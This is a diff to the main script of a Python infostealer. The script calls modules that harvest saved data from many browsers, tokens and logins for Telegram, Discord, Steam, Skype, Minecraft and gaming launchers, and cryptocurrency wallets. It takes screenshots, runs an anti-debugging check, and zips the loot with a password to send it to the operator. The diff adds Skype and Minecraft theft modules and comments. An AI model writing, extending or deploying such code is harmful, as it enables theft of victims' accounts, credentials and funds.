@@ -16,17 +16,21 @@ jabberreceiver = ''
 enableFileGrubber = False
 
 # do not change the value of the variables below
-name = ''
-password = ''
-np = []
+name = '' # name of .zip
+password = ''# pasword to .zip
+np = []# arr with name of .zip and pasword to .zip
 
 
+"""
+All imports
+"""
 from scripts.send import make_folder
 from scripts.system import system_info
 from scripts.system import programs
 from scripts.system import screenshoot
 from scripts.browsers import chrome
 from scripts.browsers import opera
+from scripts.another import Minacraft
 from scripts.browsers import firefox
 from scripts.another import telegram
 from scripts.send import send 
@@ -36,6 +40,7 @@ from scripts.another import discord
 from scripts.another import epicGames
 # from scripts.another import wup
 from scripts.wallets import wallets
+from scripts.another import skype
 #from scripts.another import BattleNET
 from scripts.another import Uplay
 from scripts.another import viber
@@ -50,6 +55,9 @@ from scripts.system import file_grubber
 from scripts.secure import antiDebug
 
 
+"""
+functions call
+"""
 antiDebug.AntiDebug
 make_folder.makeFolders()
 if enableFileGrubber:
@@ -58,12 +66,14 @@ chrome.Chrome()
 edge.Edge()
 yandex.Yandex()
 epicGames.Epic()
+skype.skype()
 Uplay.Ubisoft()
 opera.Opera()
 torch.Torch()
 chromeSxs.Chrome_SxS()
 firefox.Firefox()
 brave.Brave()
+Minacraft.Minecraft()
 steam.Steam()
 wallets.Wallets()
 #BattleNET.BattleNet()
@@ -76,7 +86,9 @@ discord.Discord()
 screenshoot.Screenshot()
 
 
-
+"""
+Make .zip of logs and send it to you
+"""
 try:
     np = clear.makemeZip(name,password,np)
     print(np)
